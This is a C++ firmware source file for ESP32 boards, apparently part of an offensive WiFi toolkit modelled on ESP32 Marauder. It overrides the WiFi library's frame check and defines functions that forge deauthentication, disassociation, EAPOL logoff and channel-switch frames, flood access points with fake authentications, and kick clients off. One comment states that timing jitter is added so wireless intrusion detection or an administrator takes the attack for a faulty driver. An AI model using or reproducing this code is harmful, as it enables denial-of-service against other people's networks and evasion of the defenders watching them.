// WSL Bypasser - Bypass ESP32 WiFi frame validation for raw TX
// Based on ESP32 Marauder's approach using -zmuldefs linker flag
// 
// The ESP32 WiFi library checks ieee80211_raw_frame_sanity_check() before
// transmitting raw frames. By defining our own version and using -zmuldefs,
// our function takes precedence over the library version.

#include "wsl_bypasser.h"
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_random.h>
#include <string.h>
#include <Arduino.h>

// ieee80211_raw_frame_sanity_check lives in cap/sniffer.cpp

namespace WSLBypasser {

bool initialized = false;

void init() {
    if (initialized) return;
    
    // Log that bypass is active
    Serial.println("[WSL] Frame validation bypass active (-zmuldefs)");
    initialized = true;
}

void randomizeMAC() {
    uint8_t mac[6];
    
    // Generate random MAC using hardware RNG
    esp_fill_random(mac, 6);
    
    // Set locally administered bit (bit 1 of first byte) and clear multicast bit (bit 0)
    // This marks it as a valid unicast locally-administered address
    mac[0] = (mac[0] & 0xFC) | 0x02;
    
    // Apply the new MAC address
    esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, mac);
    
    if (result == ESP_OK) {
        Serial.printf("[WSL] MAC randomized: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        Serial.printf("[WSL] MAC randomization failed: %d\n", result);
    }
}

bool sendDeauthFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    // Ensure we're on the right channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Deauth frame (26 bytes)
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth (subtype 0x0C)
        0x00, 0x00,  // Duration
        // Addr1 (DA - destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Addr2 (SA - source, spoofed as BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Addr3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Sequence control
        0x00, 0x00,
        // Reason code (2 bytes, little endian)
        0x07, 0x00   // Class 3 frame received from non-associated station
    };
    
    // Set addresses
    memcpy(deauthPacket + 4, staMac, 6);   // Destination
    memcpy(deauthPacket + 10, bssid, 6);   // Source (AP)
    memcpy(deauthPacket + 16, bssid, 6);   // BSSID
    deauthPacket[24] = reason;             // Reason code
    
    // Try to send
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    return (result == ESP_OK);
}

bool sendDisassocFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Disassoc frame (26 bytes) - same structure as deauth
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (subtype 0x0A)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code: Disassociated because station leaving
    };
    
    memcpy(disassocPacket + 4, staMac, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    return (result == ESP_OK);
}

static esp_err_t rawTx(const void* buf, int len) {
    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
    if (rc != ESP_OK) rc = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
    return rc;
}

static const uint8_t kAssocTail[] = {
    0x01, 0x08,
    0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,
    0x30, 0x14,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00
};

bool sendAuthentication(const uint8_t* bssid) {
    if (!bssid) return false;
    uint8_t f[30] = {};
    f[0] = 0xB0;
    memcpy(f + 4, bssid, 6);
    esp_wifi_get_mac(WIFI_IF_STA, f + 10);
    memcpy(f + 16, bssid, 6);
    f[26] = 0x01;
    return rawTx(f, 30) == ESP_OK;
}

bool sendAssociationRequest(const uint8_t* bssid, const char* ssid) {
    if (!bssid || !ssid) return false;
    uint8_t frame[128];
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
    uint16_t len = 0;
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    memcpy(frame + len, bssid, 6); len += 6;
    memcpy(frame + len, ourMac, 6); len += 6;
    memcpy(frame + len, bssid, 6); len += 6;
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    frame[len++] = 0x11;
    frame[len++] = 0x00;
    frame[len++] = 0x0A;
    frame[len++] = 0x00;
    uint8_t sl = (uint8_t)strlen(ssid);
    if (sl > 32) sl = 32;
    frame[len++] = 0x00;
    frame[len++] = sl;
    memcpy(frame + len, ssid, sl); len += sl;
    memcpy(frame + len, kAssocTail, sizeof(kAssocTail));
    len += sizeof(kAssocTail);
    return rawTx(frame, len) == ESP_OK;
}

static const uint8_t kEapolTail[] = {
    0x00, 0x00,
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E,
    0x01, 0x00, 0x00, 0x00
};

bool sendEAPOLStart(const uint8_t* bssid, const uint8_t* clientMac) {
    if (!bssid || !clientMac) return false;
    uint8_t f[36];
    f[0] = 0x08; f[1] = 0x01; f[2] = 0x00; f[3] = 0x00;
    memcpy(f + 4, bssid, 6);
    memcpy(f + 10, clientMac, 6);
    memcpy(f + 16, bssid, 6);
    memcpy(f + 22, kEapolTail, sizeof(kEapolTail));
    f[33] = 0x01;
    return rawTx(f, 36) == ESP_OK;
}

bool sendEAPOLLogoff(const uint8_t* bssid, const uint8_t* clientMac) {
    if (!bssid || !clientMac) return false;
    uint8_t f[36];
    f[0] = 0x08; f[1] = 0x01; f[2] = 0x00; f[3] = 0x00;
    memcpy(f + 4, bssid, 6);
    memcpy(f + 10, clientMac, 6);
    memcpy(f + 16, bssid, 6);
    memcpy(f + 22, kEapolTail, sizeof(kEapolTail));
    f[33] = 0x02;
    return rawTx(f, 36) == ESP_OK;
}

bool sendCSABeacon(const uint8_t* bssid, const char* ssid,
                   uint8_t currentChan, uint8_t targetChannel, uint8_t switchCount) {
    if (!bssid) return false;
    if (!ssid) ssid = "";
    uint8_t frame[128] = {};
    uint16_t len = 0;
    frame[len++] = 0x80;
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    memset(frame + len, 0xFF, 6); len += 6;
    memcpy(frame + len, bssid, 6); len += 6;
    memcpy(frame + len, bssid, 6); len += 6;
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    len += 8;
    frame[len++] = 0x64;
    frame[len++] = 0x00;
    frame[len++] = 0x31;
    frame[len++] = 0x00;
    uint8_t sl = (uint8_t)strlen(ssid);
    if (sl > 32) sl = 32;
    frame[len++] = 0x00;
    frame[len++] = sl;
    memcpy(frame + len, ssid, sl); len += sl;
    frame[len++] = 0x01; frame[len++] = 0x08;
    frame[len++] = 0x82; frame[len++] = 0x84;
    frame[len++] = 0x8B; frame[len++] = 0x96;
    frame[len++] = 0x0C; frame[len++] = 0x12;
    frame[len++] = 0x18; frame[len++] = 0x24;
    frame[len++] = 0x03; frame[len++] = 0x01; frame[len++] = currentChan;
    frame[len++] = 0x25; frame[len++] = 0x03;
    frame[len++] = 0x01;
    frame[len++] = targetChannel;
    frame[len++] = switchCount ? switchCount : 1;
    return rawTx(frame, len) == ESP_OK;
}

bool sendAuthFlood(const uint8_t* bssid, uint8_t count) {
    if (!bssid || count == 0) return false;
    uint8_t f[30] = {};
    f[0] = 0xB0;
    memcpy(f + 4, bssid, 6);
    memcpy(f + 16, bssid, 6);
    f[26] = 0x01;
    if (count > 12) count = 12;
    for (uint8_t i = 0; i < count; i++) {
        esp_fill_random(f + 10, 6);
        f[10] = (uint8_t)((f[10] & 0xFC) | 0x02);
        rawTx(f, 30);
    }
    return true;
}

void sendBidirectionalKick(const uint8_t* bssid, const uint8_t* client, uint8_t reason, uint8_t rounds) {
    if (!bssid || !client) return;
    if (rounds < 1) rounds = 1;
    if (rounds > 6) rounds = 6;
    uint8_t ap2cl[26] = {};
    memcpy(ap2cl + 4, client, 6);
    memcpy(ap2cl + 10, bssid, 6);
    memcpy(ap2cl + 16, bssid, 6);
    ap2cl[24] = reason;
    uint8_t cl2ap[26] = {};
    memcpy(cl2ap + 4, bssid, 6);
    memcpy(cl2ap + 10, client, 6);
    memcpy(cl2ap + 16, bssid, 6);
    cl2ap[24] = reason;
    // Porkchop-style jitter: a WIDS or sharp admin will see four identical
    // frames at zero spacing as a tool signature. Spacing them by 1-3 ms
    // (random per leg and per round) puts the burst inside the
    // 'looks like a glitchy driver' envelope instead. delay() blocks the
    // calling task for the given ms; we're on the main loop (not in the
    // WiFi promiscuous callback) so this is safe.
    for (uint8_t i = 0; i < rounds; i++) {
        ap2cl[0] = 0xC0;
        rawTx(ap2cl, 26);
        delay(1 + (esp_random() % 3));            // 1..3 ms AP->Client spacing
        cl2ap[0] = 0xC0;
        rawTx(cl2ap, 26);
        delay(1 + (esp_random() % 3));            // 1..3 ms Client->AP spacing
        ap2cl[0] = 0xA0;
        rawTx(ap2cl, 26);
        delay(1 + (esp_random() % 3));            // 1..3 ms before disassoc
        cl2ap[0] = 0xA0;
        rawTx(cl2ap, 26);
        if (i + 1 < rounds) {
            delay(2 + (esp_random() % 4));        // 2..5 ms between rounds
        }
    }
}

}
